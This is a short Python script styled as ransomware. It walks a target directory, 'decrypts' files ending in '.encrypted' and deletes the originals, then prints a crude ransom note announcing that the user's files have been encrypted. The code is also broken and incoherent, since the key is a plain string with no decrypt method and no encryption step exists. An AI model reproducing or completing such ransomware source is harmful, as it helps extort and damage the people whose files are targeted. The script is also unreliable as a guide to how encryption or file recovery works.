import os
import shutil

# Directory to target for file encryption
target_directory = '/user/files'

# Function to decrypt files
def decrypt_files(encryption_key):
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)

            # Decrypt only encrypted files
            if file.endswith('.encrypted'):
                # Read encrypted file data
                with open(file_path, 'rb') as encrypted_file:
                    encrypted_data = encrypted_file.read()

                # Decrypt file data with encryption key
                decrypted_data = encryption_key.decrypt(encrypted_data)

                # Write decrypted data back to the file
                with open(file_path[:-10], 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_data)

                # Remove the encrypted file
                os.remove(file_path)

# Display a message to the user
def display_message():
    ransom_note = '''
    Your files have been encrypted!
    e.g go fuck off
    '''

    print(ransom_note)

# Encryption key (for demonstration purposes only)
encryption_key = '12345678901234567890123456789012'

# Call the decryption function
decrypt_files(encryption_key)

# Display the ransom note to the user
display_message()
